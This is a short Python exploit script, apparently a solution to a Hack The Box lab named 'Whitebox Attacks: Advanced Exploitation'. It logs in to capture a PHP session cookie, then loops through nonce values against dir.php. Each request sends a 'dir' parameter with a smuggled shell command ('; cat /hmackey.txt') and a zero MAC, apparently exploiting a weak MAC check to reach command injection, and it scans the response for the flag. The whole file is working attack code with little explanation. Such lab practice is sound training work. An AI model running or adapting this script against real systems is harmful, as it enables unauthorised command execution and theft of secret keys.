import argparse
import requests
import re

# Target URL and headers
HEADERS_TEMPLATE = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

def login(username, password, target):
    session = requests.Session()
    try:
        response = session.post(target, data={'username': username, 'password': password}, timeout=5)
    except requests.RequestException as e:
        print(f"Login error: {e}")
        return None

    if response.status_code != 200:
        print(f"Login failed: {response.status_code}")
        return None

    phpsessid = session.cookies.get("PHPSESSID")
    if not phpsessid:
        print("PHPSESSID not found in cookies")
        return None

    return phpsessid


def make_request(target, sid, nonce):
    session = requests.Session()
    headers = HEADERS_TEMPLATE.copy()
    headers["Cookie"] = f"PHPSESSID={sid}"

    response = requests.get(target + "/dir.php", headers=headers, 
                params={"dir": "/home/htb-stdnt/; cat /hmackey.txt", "nonce": nonce, "mac": 0}) 
    
    if response.status_code != 200:
        print(f"Request failed")
        return False

    if not "Error! Invalid MAC" in response.text:
        print(f"Valid MAC: {response.url}")
        match = re.search(r'HTB\{[A-Za-z0-9]+\}', response.text)
        if match:
            print(f"FLAG: {match.group(0)}")
            return match.group(0)
        else:
            print("No flag found")
        return True


def parse_args():
    parser = argparse.ArgumentParser(description="Whitebox Attacks: Advanced Exploitation.")
    
    parser.add_argument("-t", "--target", type=str, required=True, help="Target")
    parser.add_argument("--username", type=str, required=True, help="Username for login")
    parser.add_argument("--password", type=str, required=True, help="Password for login")
    parser.add_argument("--nonce", type=int, required=True, help="Max value for the nonce")
    
    return parser.parse_args()

def main():
    args = parse_args()

    sid = login(args.username, args.password, args.target)

    for n in range(args.nonce):
        print(f"[*] Attempt {n}: {sid}     ", end='\r', flush=True)
        if make_request(args.target, sid,n):
            break




if __name__ == "__main__":
    main()
